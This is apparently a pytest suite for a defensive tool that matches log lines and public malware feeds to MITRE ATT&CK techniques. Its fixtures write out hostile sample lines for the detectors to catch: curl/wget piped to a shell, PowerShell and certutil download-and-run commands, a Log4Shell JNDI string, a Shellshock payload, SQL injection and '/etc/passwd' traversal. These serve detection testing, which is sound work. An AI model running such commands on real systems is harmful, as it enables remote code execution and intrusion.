"""MITRE ATT&CK hints: the reference data is consistent, each pattern fires on what it should and stays quiet otherwise,
the hints reach the report, the pages and the saved analysis, and the log lines they read never leak into the report."""

import ast
import gzip
import json
import re
import sqlite3
import time
from pathlib import Path

import pytest

from threatweaver import analysis_cache, attack, attack_data as data, store
from threatweaver.attack import Facts, assess
from threatweaver.feeds import FEODO, URLHAUS, load_feed
from threatweaver.pipeline import run
from threatweaver.report import build_report, render_markdown
from threatweaver.web import api
from threatweaver.web.api import ApiError, Context

SRC = Path(attack.__file__).resolve().parent


# ------------------------------------------------------------------ the reference data
def test_every_technique_the_patterns_use_exists():
    used = {t for p in attack.PATTERNS for t in (*p.techniques, *p.inside)}
    assert used and used <= set(data.TECHNIQUES), sorted(used - set(data.TECHNIQUES))


def test_every_technique_a_family_lists_exists():
    for key, (software_id, name, aliases, techniques) in data.SOFTWARE.items():
        assert set(techniques) <= set(data.TECHNIQUES), key
        assert re.fullmatch(r"S\d{4}", software_id) and name and key in aliases and _normal(name) in aliases
        assert list(techniques) == sorted(set(techniques), key=lambda t: [int(x) for x in t[1:].split(".")]), "lists are sorted and unique"


def _normal(name):
    return re.sub(r"[^a-z0-9]", "", name.lower())


def test_identifiers_and_addresses_have_the_right_shape():
    tactic_ids = {t for t, _ in data.TACTICS}
    assert len(tactic_ids) == len(data.TACTICS) and all(re.fullmatch(r"TA\d{4}", t) for t in tactic_ids)
    for tid, (name, tactics) in data.TECHNIQUES.items():
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", tid) and name.strip() == name and name
        assert tactics and set(tactics.split()) <= tactic_ids, tid
    assert attack.technique_url("T1059") == "https://attack.mitre.org/techniques/T1059/"
    assert attack.technique_url("T1059.001") == "https://attack.mitre.org/techniques/T1059/001/"
    assert attack.software_url("S0367") == "https://attack.mitre.org/software/S0367/"
    info = attack.technique("T1078.003")
    assert info["tactics"] == ["Initial Access", "Persistence", "Privilege Escalation", "Stealth"], "tactics come in matrix order"


def test_the_data_carries_the_mitre_notice():
    doc = data.__doc__
    assert "The MITRE Corporation" in doc and "reproduced and distributed with the permission" in doc
    assert "royalty-free" in doc and "ATT&CK" in doc
    assert "The MITRE Corporation" in attack.COPYRIGHT and attack.COPYRIGHT.startswith("\u00a9")


def test_family_names_resolve_in_any_spelling():
    assert attack.families(["QuakBot", "Qbot"]) == ["qakbot"]
    assert attack.families(["Heodo", "Emotet", "epoch4"]) == ["emotet"]
    assert attack.families(["BazarLoader", "BazarBackdoor"]) == ["bazar"]
    assert attack.families(["Dridex", "TrickBot"]) == ["dridex", "trickbot"]
    assert attack.families(["", None, 5, "elf", "32-bit", "Mozi"]) == []


# ------------------------------------------------------------------ the pattern table
def test_the_pattern_table_is_well_formed():
    ids = [p.id for p in attack.PATTERNS]
    assert ids == sorted(set(ids)) and all(re.fullmatch(r"AT-\d\d", i) for i in ids)
    for p in attack.PATTERNS:
        assert p.basis in attack.BASIS_LABEL and p.title and p.meaning and p.techniques and p.check
        assert all(c.strip() for c in p.check)
        if p.regex is None:
            assert not p.needles and not p.evidence and p.basis != "log"
        else:
            assert p.basis == "log" and p.needles and p.evidence and p.min_lines >= 1
            assert all(n == n.lower() for n in p.needles), "needles are compared with the lower-cased line"


def test_no_advice_says_to_act_on_its_own():
    text = " ".join(" ".join(p.check) + p.meaning for p in attack.PATTERNS).lower()
    for phrase in ("automatically", "will be blocked", "has been blocked", "quarantined"):
        assert phrase not in text
    assert "person" in attack.BY_ID["AT-01"].check[-1], "containment is always left to a person"


# One line that must trigger each log pattern, and one that must not. The first of each pair is also what the needles must let through.
LOG_CASES = {
    "AT-07": ("Dec 10 06:55:46 LabSZ sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2",
              "Dec 10 06:55:46 LabSZ sshd[24200]: Accepted publickey for alice from 10.0.0.5 port 5522 ssh2"),
    "AT-08": ("2024-05-01T00:00:00,192.168.1.125,192.168.1.124,TCP,blocked,benign,firewall,10889,Nmap Scripting Engine,/",
              "2024-05-01T00:00:00,192.168.1.125,192.168.1.124,TCP,allowed,benign,firewall,10889,Mozilla/5.0 (Windows NT 10.0),/"),
    "AT-09": ('203.0.113.9 - - "GET /cgi-bin/ HTTP/1.1" 404 "Nikto/2.1.6"', '203.0.113.9 - - "GET /index.html HTTP/1.1" 200 "Mozilla/5.0"'),
    "AT-10": ('203.0.113.9 - - "GET /admin HTTP/1.1" 404 "gobuster/3.1.0"', '203.0.113.9 - - "GET /gob.html HTTP/1.1" 200 "Mozilla/5.0"'),
    "AT-11": ('203.0.113.9 "POST /login" "Mozilla/4.0 (Hydra)"', "hydra cluster node 3 ready on 203.0.113.9"),
    "AT-12": ("203.0.113.9 GET /item?id=1 UNION SELECT username,password FROM users--", "203.0.113.9 Credit union selection page opened"),
    "AT-13": ("203.0.113.9 GET /../../etc/passwd HTTP/1.1", "203.0.113.9 GET /a/b/c.html HTTP/1.1"),
    "AT-14": ("powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA host 203.0.113.9",
              "powershell.exe -File backup.ps1 host 203.0.113.9"),
    "AT-15": ("certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe", "curl -I http://203.0.113.9/health"),
    "AT-16": ("mshta.exe http://203.0.113.9/a.hta", "regsvr32 /s mylib.dll from 203.0.113.9"),
    "AT-17": ("[error] [client 203.0.113.9] File does not exist: /var/www/html/wp-login.php", "[error] [client 203.0.113.9] mod_jk ready"),
    "AT-18": ("sshd[1]: Did not receive identification string from 203.0.113.9", "sshd[1]: Received disconnect from 203.0.113.9: 11: Bye Bye"),
}
EXTRA_POSITIVES = {
    "AT-08": ["masscan/1.3 scanning 203.0.113.9", "zgrab/0.x 203.0.113.9"],
    "AT-12": ["203.0.113.9 SQLMap/1.6-dev", "203.0.113.9 GET /p?id=1' or '1'='1", "203.0.113.9 GET /p?id=1%27%20or%20%271%27=%271"],
    "AT-13": ["203.0.113.9 ${jndi:ldap://203.0.113.5/a}", "203.0.113.9 () { :;}; /bin/bash -c id", "203.0.113.9 GET /%2e%2e%2fetc"],
    "AT-14": ["203.0.113.9 [System.Convert]::FromBase64String('AAAA')"],
    "AT-15": ["curl http://203.0.113.9/a.sh | sh", "wget -qO- http://203.0.113.9/a | bash",
              "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')", "bitsadmin /transfer j http://203.0.113.9/a C:\\a.exe",
              "iwr https://203.0.113.9/a -OutFile a.exe", "Invoke-WebRequest http://203.0.113.9/a"],
    "AT-16": ["regsvr32 /s /n /u /i:http://203.0.113.9/a.sct scrobj.dll"],
    "AT-17": ["[error] Directory index forbidden by rule: /var/www/html/", "[error] script not found or unable to stat: /usr/lib/cgi-bin/php"],
    "AT-18": ["Bad protocol version identification 'GET / HTTP/1.0' from 203.0.113.9", "Invalid HTTP request from 203.0.113.9"],
    "AT-07": ["pam_unix(sshd:auth): authentication failure; rhost=203.0.113.9", "FAILED LOGIN (1) on 'tty1' FROM 203.0.113.9",
              "reverse mapping checking getaddrinfo failed - POSSIBLE BREAK-IN ATTEMPT!", "Invalid user admin from 203.0.113.9"],
}


def fires(pid, lines, **kw):
    found = assess(Facts(type=kw.pop("type", "ipv4"), lines=lines, sightings=len(lines), **kw))
    return any(f["pattern"] == pid for f in found)


@pytest.mark.parametrize("pid", sorted(LOG_CASES))
def test_a_log_pattern_fires_on_its_line_and_not_on_the_look_alike(pid):
    positive, negative = LOG_CASES[pid]
    p = attack.BY_ID[pid]
    lines_needed = max(p.min_lines, 1)
    assert fires(pid, [positive] * lines_needed), "the positive line must trigger it"
    assert not fires(pid, [negative] * 20), "the look-alike must not"
    if lines_needed > 1:
        assert not fires(pid, [positive] * (lines_needed - 1)), "it needs several lines, not one"


@pytest.mark.parametrize("pid", sorted(EXTRA_POSITIVES))
def test_other_spellings_of_each_pattern_are_found(pid):
    p = attack.BY_ID[pid]
    for line in EXTRA_POSITIVES[pid]:
        assert p.regex.search(line), line
        assert any(n in line.lower() for n in p.needles), f"the cheap pre-check would hide: {line}"
        assert fires(pid, [line] * p.min_lines), line


def test_the_cheap_pre_check_agrees_with_the_regexes_on_every_sample():
    """The needles only decide whether the regex runs; they must never make a pattern miss what its regex matches."""
    samples = [c[0] for c in LOG_CASES.values()] + [x for xs in EXTRA_POSITIVES.values() for x in xs]
    for p in attack.PATTERNS:
        if p.regex is None:
            continue
        for line in samples:
            if p.regex.search(line):
                assert any(n in line.lower() for n in p.needles), (p.id, line)


def test_log_patterns_ignore_hashes_and_stay_fast_on_hostile_lines():
    line = LOG_CASES["AT-07"][0]
    assert not fires("AT-07", [line] * 5, type="sha256")
    hostile = ["powershell " * 40, "a" * 400, "union " * 60, "' or " * 70, "curl " + "a" * 390, "%2e" * 130, "failed " * 60,
               "regsvr32 " + "/i:" * 130, "bitsadmin " + " " * 380 + "/transfer", "certutil " + "x" * 380]
    started = time.perf_counter()
    for _ in range(20):
        assess(Facts(type="ipv4", lines=hostile * 2, sightings=40))
    assert time.perf_counter() - started < 3, "a hostile line must not make the patterns slow"


# ------------------------------------------------------------------ other patterns
def feed_match(feed, via="exact", **fields):
    return {"feed": feed, "via": via, "fields": fields, "listed_url": "http://203.0.113.9/a"}


def pids(found):
    return [f["pattern"] for f in found]


def test_a_feodo_listing_suggests_a_c2_server_and_names_the_family():
    (hint,) = assess(Facts(type="ipv4", matches=[feed_match("feodotracker", malware="QuakBot", status="online")]))
    assert hint["pattern"] == "AT-01" and hint["techniques"] == ["T1071"] and hint["software"] == ["qakbot"]
    assert "QakBot" in hint["why"] and "online" in hint["why"]
    (offline,) = assess(Facts(type="ipv4", matches=[feed_match("feodotracker", malware="Dridex", status="offline")]))
    assert "not online" in offline["why"] and offline["software"] == ["dridex"]


def test_an_unknown_family_is_named_safely_and_gets_no_software_block():
    (hint,) = assess(Facts(type="ipv4", matches=[feed_match("feodotracker", malware="Evil<script>alert(1)</script> Bot", status="online")]))
    assert hint["software"] == [] and "<" not in hint["why"] and ">" not in hint["why"]


def test_a_urlhaus_listing_suggests_a_malware_link_and_reads_family_tags():
    (hint,) = assess(Facts(type="url", matches=[feed_match("urlhaus", tags=["elf", "Emotet", "epoch4"], status="online")]))
    assert hint["pattern"] == "AT-02" and hint["software"] == ["emotet"] and "Emotet" in hint["why"]
    assert set(hint["techniques"]) == {"T1105", "T1204.001", "T1189"}


def test_the_host_of_a_listed_url_suggests_a_malware_server():
    found = assess(Facts(type="domain", matches=[feed_match("urlhaus", via="hosts_feed_url", tags=["IcedID"]),
                                                  feed_match("urlhaus", via="hosts_feed_url", tags=[])]))
    assert pids(found) == ["AT-03"] and found[0]["software"] == ["icedid"]
    assert "URLhaus lists 1 URL(s)" in found[0]["why"]  # both matches point at the same listed URL


def test_a_disguised_file_name_and_an_email_on_the_same_line():
    assert pids(assess(Facts(type="filename", disguised=True))) == ["AT-04"]
    assert pids(assess(Facts(type="filename", disguised=True, linked_email=True))) == ["AT-04", "AT-05"]
    assert pids(assess(Facts(type="filename", disguised=False, linked_email=True))) == []
    assert pids(assess(Facts(type="email", linked_disguised_file=True))) == ["AT-05"]
    assert pids(assess(Facts(type="email"))) == [], "an e-mail address alone says nothing"
    assert pids(assess(Facts(type="email", linked_risky_domain=True))) == ["AT-06"]
    assert pids(assess(Facts(type="ipv4", linked_email=True, linked_disguised_file=True, linked_risky_domain=True))) == []


def test_volume_alone_is_a_last_resort_and_never_overrides_what_the_log_says():
    busy = {"TW-T10": 25}
    assert pids(assess(Facts(type="ipv4", rules=busy, sightings=5000))) == ["AT-19"]
    assert pids(assess(Facts(type="ipv4", rules={"TW-T10": 10}, sightings=500))) == [], "hundreds of sightings are not enough"
    nmap = LOG_CASES["AT-08"][0]
    assert pids(assess(Facts(type="ipv4", rules=busy, sightings=5000, lines=[nmap]))) == ["AT-08"]
    quiet = ["203.0.113.9 GET / 200"]
    assert pids(assess(Facts(type="ipv4", rules=busy, sightings=5000, lines=quiet))) == ["AT-19"]
    assert attack.BY_ID["AT-19"].basis == "volume"


def test_inside_the_network_scanning_is_discovery_not_reconnaissance():
    lines = [LOG_CASES["AT-08"][0]]
    outside = assess(Facts(type="ipv4", lines=lines, sightings=1))[0]
    inside = assess(Facts(type="ipv4", lines=lines, sightings=1, internal=True))[0]
    assert set(outside["techniques"]) == {"T1595.001", "T1595.002"} and "private range" not in outside["why"]
    assert inside["techniques"] == ["T1046"] and "private range" in inside["why"]
    assert attack.technique("T1046")["tactics"] == ["Discovery"] and attack.technique("T1595.001")["tactics"] == ["Reconnaissance"]
    brute = assess(Facts(type="ipv4", lines=[LOG_CASES["AT-07"][0]] * 3, sightings=3, internal=True))[0]
    assert brute["techniques"] == ["T1110", "T1110.001"], "password guessing is the same technique from inside"


def test_the_reason_never_repeats_log_text():
    secret = "SECRET-TOKEN-4242"
    lines = [f"{LOG_CASES['AT-07'][0]} user={secret}"] * 5
    found = assess(Facts(type="ipv4", lines=lines, sightings=50))
    assert found and all(secret not in json.dumps(f) for f in found)
    assert "first 5" in found[0]["why"] or "of the first" in found[0]["why"]


def test_the_wording_of_how_many_lines_matched():
    line = LOG_CASES["AT-07"][0]
    assert "All 4 stored log lines" in assess(Facts(type="ipv4", lines=[line] * 4, sightings=4))[0]["why"]
    assert "3 of the 4 stored log lines" in assess(Facts(type="ipv4", lines=[line] * 3 + ["ok"], sightings=4))[0]["why"]
    assert "3 of the first 4 stored log lines" in assess(Facts(type="ipv4", lines=[line] * 3 + ["ok"], sightings=900))[0]["why"]


# ------------------------------------------------------------------ roll-ups and views
def test_a_rollup_counts_each_indicator_once():
    one = [{"pattern": "AT-07", "techniques": ["T1110", "T1110.001"], "software": []},
           {"pattern": "AT-11", "techniques": ["T1110", "T1110.001"], "software": []}]
    two = [{"pattern": "AT-07", "techniques": ["T1110"], "software": ["emotet"]}]
    roll = attack.rollup([one, two, []])
    assert roll == {"patterns": {"AT-07": 2, "AT-11": 1}, "techniques": {"T1110": 2, "T1110.001": 1}, "software": {"emotet": 1}}


def test_techniques_are_grouped_under_every_tactic_they_belong_to():
    groups = attack.by_tactic({"T1078.003": 2, "T1110": 5, "T1071": 0})
    by = {g["tactic"]: g for g in groups}
    assert [g["tactic"] for g in groups] == [t for t in attack.TACTIC_ORDER if t in by], "matrix order"
    assert {"Initial Access", "Persistence", "Privilege Escalation", "Stealth", "Credential Access"} == set(by)
    assert [t["id"] for t in by["Credential Access"]["techniques"]] == ["T1110"] and "T1071" not in str(groups), "zero counts are left out"
    assert attack.by_tactic({"T1071": 0}, only_counted=False)[0]["techniques"][0]["id"] == "T1071"


def test_the_views_resolve_names_and_order_patterns_by_strength():
    rows = attack.patterns_view({"AT-19": 40, "AT-07": 3, "AT-01": 1, "AT-02": 0})
    assert [r["pattern"] for r in rows] == ["AT-01", "AT-07", "AT-19"]
    view = attack.finding_view({"pattern": "AT-01", "why": "x", "techniques": ["T1071"], "software": ["emotet"]})
    assert view["techniques"][0]["name"] == "Application Layer Protocol" and view["check"]
    (sw,) = view["software"]
    assert sw["name"] == "Emotet" and sw["techniques_total"] == len(data.SOFTWARE["emotet"][3]) and sw["url"].endswith("/software/S0367/")
    listed = {t["id"] for g in sw["by_tactic"] for t in g["techniques"]}
    assert listed == set(data.SOFTWARE["emotet"][3])


def test_every_address_the_pages_can_receive_points_at_attack_mitre_org():
    urls = [attack.technique(t)["url"] for t in data.TECHNIQUES] + [attack.software_url(v[0]) for v in data.SOFTWARE.values()]
    assert all(u.startswith("https://attack.mitre.org/") and " " not in u for u in urls)


# ------------------------------------------------------------------ the report
LOG = (
    "".join(f"Dec 10 06:55:{i:02d} LabSZ sshd[24200]: Failed password for root from 203.0.113.50 port 38926 ssh2 SECRET-TOKEN-4242\n"
            for i in range(6)) +
    "198.51.100.60 beacon check-in\n"
    "From: billing@example.org attachment: invoice.pdf.exe\n"
    "proxy GET http://198.51.100.77/a.exe 200\n"
)
FEODO_JSON = json.dumps([{"ip_address": "198.51.100.60", "port": 443, "status": "online", "malware": "Heodo", "first_seen": "2026-10-01"}])
URLHAUS_CSV = ('# id,dateadded,url,url_status,last_online,threat,tags,urlhaus_link,reporter\n'
               '1,2026-10-01,http://198.51.100.77/a.exe,online,2026-10-02,malware_download,"exe,Emotet",http://x,someone\n')


def build(log=LOG, feeds=True):
    conn = store.connect(":memory:")
    store.ingest_text(conn, log, "a.log")
    if feeds:
        load_feed(conn, FEODO, FEODO_JSON, "2026-10-10T00:00:00+00:00")
        load_feed(conn, URLHAUS, URLHAUS_CSV, "2026-10-10T00:00:00+00:00")
    return conn


def hints_by_value(report):
    return {i["value"]: [h["pattern"] for h in i.get("attack", ())] for c in report["cases"] for i in c["indicators"]}


def test_the_report_carries_the_hints_for_each_indicator():
    report = run(build()).report
    got = hints_by_value(report)
    assert got["203.0.113.50"] == ["AT-07"]
    assert got["198.51.100.60"] == ["AT-01"]
    assert got["http://198.51.100.77/a.exe"] == ["AT-02"]
    assert got["198.51.100.77"] == ["AT-03"]
    assert got["invoice.pdf.exe"] == ["AT-04", "AT-05"] and got["billing@example.org"] == ["AT-05"]
    sec = report["attack"]
    assert sec["framework"] == "MITRE ATT&CK Enterprise v20" and "MITRE Corporation" in sec["copyright"]
    assert {pid for pid, p in sec["patterns"].items() if p["indicators"]} == {"AT-01", "AT-02", "AT-03", "AT-04", "AT-05", "AT-07"}
    assert sec["patterns"]["AT-05"]["indicators"] == 2
    assert {"emotet"} == set(sec["software"]) and sec["software"]["emotet"]["id"] == "S0367"
    assert "T1110.001" in sec["techniques"] and sec["techniques"]["T1110.001"]["indicators"] == 1
    assert "T1003.001" in sec["techniques"] and sec["techniques"]["T1003.001"]["indicators"] == 0, "a family's other techniques are listed, not counted"
    tactics = [g["tactic"] for g in sec["by_tactic"]]
    assert tactics == [t for t in attack.TACTIC_ORDER if t in tactics] and "Credential Access" in tactics and "Command and Control" in tactics


def test_cases_roll_up_their_indicators_and_empty_ones_have_no_entry():
    report = run(build()).report
    by_ioc = {i["value"]: c for c in report["cases"] for i in c["indicators"]}
    mail_case = by_ioc["invoice.pdf.exe"]
    assert mail_case["attack"]["patterns"] == {"AT-04": 1, "AT-05": 2}, "the e-mail and the file each count once"
    quiet = run(build(log="203.0.113.5 hello\n", feeds=False)).report
    assert all("attack" not in c and all("attack" not in i for i in c["indicators"]) for c in quiet["cases"])
    assert all(p["indicators"] == 0 for p in quiet["attack"]["patterns"].values()) and quiet["attack"]["by_tactic"] == []


def test_log_lines_are_read_for_hints_but_never_put_in_the_report():
    pr = run(build())
    assert "SECRET-TOKEN-4242" not in json.dumps(pr.report) and "SECRET-TOKEN-4242" not in render_markdown(pr.report)
    assert hints_by_value(pr.report)["203.0.113.50"] == ["AT-07"]


def test_lines_stored_by_an_older_version_give_no_log_hints_and_no_error():
    conn = build()
    with conn:
        conn.execute("UPDATE observations SET context = NULL")
    got = hints_by_value(run(conn).report)
    assert got["203.0.113.50"] == [] and got["198.51.100.60"] == ["AT-01"], "feed hints do not need the log lines"


def test_the_markdown_shows_the_view_the_hints_and_the_notice():
    md = render_markdown(run(build()).report)
    assert "## MITRE ATT&CK view" in md and "Possibilities to check, not findings" in md
    assert "| Botnet command-and-control server (`AT-01`) | public feed | 1 |" in md
    assert "| Credential Access | `T1110` Brute Force (1); `T1110.001` Password Guessing (1) |" in md
    assert "- ATT&CK `AT-07` Repeated failed logins (words in stored log lines):" in md
    assert "Techniques to consider: `T1110` Brute Force, `T1110.001` Password Guessing." in md
    assert "The MITRE Corporation" in md and "MITRE ATT&CK Enterprise v20" in md
    assert "attack.mitre.org" not in md.replace("attack[.]mitre[.]org", ""), "the address is defanged like every other"
    assert render_markdown(run(build(log="203.0.113.5 hello\n", feeds=False)).report).count("## MITRE ATT&CK view") == 0


def test_the_hints_are_the_same_every_time():
    a, b = run(build()).report, run(build()).report
    assert json.dumps(a["attack"], sort_keys=True) == json.dumps(b["attack"], sort_keys=True)
    assert hints_by_value(a) == hints_by_value(b)


def test_hash_indicators_do_not_have_their_log_lines_read():
    conn = store.connect(":memory:")
    store.ingest_text(conn, "sshd Failed password from 203.0.113.50 hash " + "ab" * 32 + "\n", "a.log")
    seen = []
    conn.set_trace_callback(seen.append)
    build_report(conn)
    conn.set_trace_callback(None)
    per_ioc = [s for s in seen if "FROM observations WHERE ioc_id" in s and "line_no" in s]
    assert per_ioc and sum(", context" in s for s in per_ioc) == len(per_ioc) - 1, "one indicator (the hash) skips the column"


def test_the_module_reads_no_network_and_runs_nothing():
    for name in ("attack.py", "attack_data.py"):
        tree = ast.parse((SRC / name).read_text(encoding="utf-8"))
        imported = {n.names[0].name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import)}
        imported |= {n.module.split(".")[0] if n.module else "" for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
        assert imported <= {"__future__", "re", "collections", "dataclasses", "typing", ""}, (name, imported)


def test_a_change_to_the_hints_invalidates_a_saved_analysis():
    assert {"attack", "attack_data"} <= set(analysis_cache._MODULES)


# ------------------------------------------------------------------ the dashboard
def make_ctx(tmp_path, log=LOG):
    ctx = Context(db_path=str(tmp_path / "a.db"), out_dir=tmp_path / "adv", cache_dir=str(tmp_path / "cache"), env={})
    conn = store.connect(ctx.db_path)
    store.ingest_text(conn, log, "a.log")
    load_feed(conn, FEODO, FEODO_JSON, "2026-10-10T00:00:00+00:00")
    load_feed(conn, URLHAUS, URLHAUS_CSV, "2026-10-10T00:00:00+00:00")
    conn.close()
    return ctx


def find(ctx, value):
    conn = ctx.connect()
    try:
        return next(i for i in api.analysis(ctx, conn).indicators.values() if i["value"] == value)
    finally:
        conn.close()


def test_an_indicators_page_lists_what_it_could_be_with_names_and_links(tmp_path):
    ctx = make_ctx(tmp_path)
    detail = api.indicator_detail(ctx, find(ctx, "198.51.100.60")["id"])
    (hint,) = detail["attack"]
    assert hint["title"] == "Botnet command-and-control server" and hint["basis"] == "feed" and hint["basis_label"] == "Public feed"
    assert hint["check"] and hint["techniques"][0] == {"id": "T1071", "name": "Application Layer Protocol",
                                                       "url": "https://attack.mitre.org/techniques/T1071/", "tactics": ["Command and Control"]}
    (sw,) = hint["software"]
    assert sw["name"] == "Emotet" and sw["by_tactic"] and sw["url"] == "https://attack.mitre.org/software/S0367/"
    plain = api.indicator_detail(ctx, find(ctx, "198.51.100.77")["id"])
    assert [h["pattern"] for h in plain["attack"]] == ["AT-03"]


def test_a_case_page_and_the_overview_summarise_the_hints(tmp_path):
    ctx = make_ctx(tmp_path)
    case_id = api.analysis(ctx, ctx.connect()).case_of[find(ctx, "203.0.113.50")["id"]]
    detail = api.case_detail(ctx, case_id)
    assert [p["pattern"] for p in detail["attack"]["patterns"]] == ["AT-07"]
    assert [g["tactic"] for g in detail["attack"]["by_tactic"]] == ["Credential Access"]
    o = api.overview(ctx)["attack"]
    assert [p["pattern"] for p in o["patterns"]][:2] == ["AT-01", "AT-02"], "strongest evidence first"
    assert o["framework"].startswith("MITRE ATT&CK") and o["by_tactic"]


def test_the_indicator_list_can_be_filtered_by_a_hint(tmp_path):
    ctx = make_ctx(tmp_path)
    rows = api.indicators(ctx, {"attack": "AT-05"})["rows"]
    assert sorted(r["value"] for r in rows) == ["billing@example.org", "invoice.pdf.exe"]
    assert all("E-mail with a disguised attachment" in r["attack"] for r in rows)
    everything = api.indicators(ctx, {})["rows"]
    assert {r["value"]: r["attack"] for r in everything}["203.0.113.50"] == ["Repeated failed logins"]
    with pytest.raises(ApiError) as e:
        api.indicators(ctx, {"attack": "AT-99"})
    assert e.value.status == 400


def test_the_hints_survive_the_saved_analysis(tmp_path):
    ctx = make_ctx(tmp_path)
    first = api.indicator_detail(ctx, find(ctx, "203.0.113.50")["id"])["attack"]
    saved = analysis_cache.path_for(ctx.db_path)
    assert saved.exists() and "AT-07" in gzip.decompress(saved.read_bytes()).decode()
    restarted = Context(db_path=ctx.db_path, out_dir=ctx.out_dir, cache_dir=ctx.cache_dir, env={})
    assert api.indicator_detail(restarted, find(restarted, "203.0.113.50")["id"])["attack"] == first


def test_the_page_script_only_links_to_attack_mitre_org_and_builds_no_html():
    js = (SRC / "web" / "static" / "app.js").read_text(encoding="utf-8")
    assert "const ATTACK_SITE = 'https://attack.mitre.org/'" in js and "t.url.startsWith(ATTACK_SITE)" in js
    assert "innerHTML" not in js and "rel: 'noopener noreferrer'" in js


def test_how_many_lines_each_log_pattern_needs():
    needed = {p.id: p.min_lines for p in attack.PATTERNS if p.regex is not None}
    assert needed == {"AT-07": 3, "AT-08": 1, "AT-09": 1, "AT-10": 1, "AT-11": 1, "AT-12": 1, "AT-13": 1, "AT-14": 1, "AT-15": 1,
                      "AT-16": 1, "AT-17": 5, "AT-18": 3}


def test_tactics_follow_the_order_of_the_matrix_not_the_alphabet():
    assert attack.technique("T1112")["tactics"] == ["Persistence", "Defense Impairment"]
    assert [g["tactic"] for g in attack.by_tactic({"T1112": 1, "T1110": 1})] == ["Persistence", "Defense Impairment", "Credential Access"]


def test_a_case_with_only_a_hint_is_not_hidden_as_quiet(tmp_path):
    ctx = make_ctx(tmp_path)
    conn = ctx.connect()
    a = api.analysis(ctx, conn)
    conn.close()
    case_id = a.case_of[find(ctx, "203.0.113.50")["id"]]
    assert case_id in {c["case_id"] for c in api.cases(ctx, {})["cases"]}, "a hint is something to look at"
    assert api.cases(ctx, {})["quiet_cases"] == 0


FLOW = "2024-05-01T00:00:00,192.168.1.125,192.168.1.124,TCP,blocked,benign,firewall,10889,Nmap Scripting Engine,/"


def hints(value, line=FLOW, type="ipv4", lines=1):
    return pids(assess(Facts(type=type, value=value, lines=[line] * lines, sightings=lines)))


def test_an_address_counts_as_the_scanner_only_where_it_comes_first_on_the_line():
    assert hints("192.168.1.125") == ["AT-08"], "the first address on a flow line is the source"
    assert hints("192.168.1.124") == [], "the one after it is what was scanned"
    assert hints("192.168.1.124", "scan from 192.168.1.125 hit 192.168.1.124 Nmap Scripting Engine") == []
    one = "[error] [client 203.0.113.9] File does not exist: /a Nmap"
    assert hints("203.0.113.9", one) == ["AT-08"], "a line with one address is not split into roles"
    assert hints("203.0.113.9", "203.0.113.9 hit 203.0.113.9 Nmap Scripting Engine") == ["AT-08"]
    mixed = [FLOW.replace("192.168.1.125", "10.9.9.9")] * 3 + [FLOW]
    assert pids(assess(Facts(type="ipv4", value="192.168.1.124", lines=mixed, sightings=4))) == [], "only target lines: nothing"
    reverse = FLOW.replace("192.168.1.125,192.168.1.124", "192.168.1.124,192.168.1.125")
    assert pids(assess(Facts(type="ipv4", value="192.168.1.124", lines=[FLOW, reverse], sightings=2))) == ["AT-08"], "one line as the source is enough"


def test_roles_are_judged_only_for_ipv4_and_only_for_patterns_about_acting_on_others():
    assert hints("198.51.100.7", FLOW, type="domain") == ["AT-08"], "other types cannot be told apart"
    assert hints("192.168.1.124", "Failed password for root from 192.168.1.125 port 22 on 192.168.1.124", lines=3) == ["AT-07"], \
        "failed logins name the server too, and the pattern is about the attempts themselves"
    ps = {p.id for p in attack.PATTERNS if p.from_source}
    assert ps == {"AT-08", "AT-09", "AT-10", "AT-11", "AT-12", "AT-13", "AT-17", "AT-18"}


def test_the_reason_says_how_roles_were_judged_where_they_were():
    ip = assess(Facts(type="ipv4", value="192.168.1.125", lines=[FLOW], sightings=1))[0]
    assert "comes first" in ip["why"]
    domain = assess(Facts(type="domain", lines=[FLOW], sightings=1))[0]
    assert "source or the target" in domain["why"]
    login = assess(Facts(type="ipv4", lines=[LOG_CASES["AT-07"][0]] * 3, sightings=3))[0]
    assert "comes first" not in login["why"] and "source or the target" not in login["why"]
    feed = assess(Facts(type="ipv4", matches=[feed_match("feodotracker", malware="Emotet", status="online")]))[0]
    assert "source or the target" not in feed["why"] and "comes first" not in feed["why"]
